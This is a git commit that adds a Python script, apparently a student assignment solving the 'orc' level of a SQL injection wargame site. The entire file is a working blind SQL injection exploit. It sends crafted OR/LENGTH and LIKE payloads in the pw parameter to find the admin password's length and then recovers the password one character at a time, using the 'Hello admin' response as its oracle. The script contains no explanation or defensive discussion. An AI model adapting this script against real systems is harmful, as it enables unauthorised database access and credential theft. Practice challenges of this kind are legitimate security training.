ba49928c15500cc4ff4dc76edd6f1b28c8d669db
zhsir123 <zhsir123@gmail.com>
2017-09-07 14:33:33 +0900

    4.py ~ 7.py

---
+++ Assignment/4.py
@@ -0,0 +1,43 @@
+import requests
+
+url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
+
+
+def get_pw_length(cookie):
+    cookie_header = {"PHPSESSID": cookie}
+
+    for i in range(1, 20):
+        query = "?pw=' || id='admin' %26%26 LENGTH(pw)={} %23".format(str(i))
+        request = url + query
+
+        response = requests.get(request, cookies=cookie_header)
+        if response.text.find("<h2>Hello admin</h2>") > 0:
+            print(i)
+            return i
+
+
+def injection(cookie, length):
+    cookie_header = {"PHPSESSID": cookie}
+    result = ""
+
+    char_list = "qwertyuiopasdfghjklzxcvbnmm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"
+
+    for i in range(length + 1):
+        for x in char_list:
+            query = "?pw=0' || pw LIKE '" + result + x + "%' %23"
+            request = url + query
+
+            response = requests.get(request, cookies=cookie_header)
+            if response.text.find("<h2>Hello admin</h2>") > 0:
+                result += x
+                print(result)
+                break
+
+            elif response.text.find("ORC") > 0:
+                print(result)
+                return result
+
+if __name__ == '__main__':
+    cookie = ""
+    length = get_pw_length(cookie)
+    injection(cookie, length)
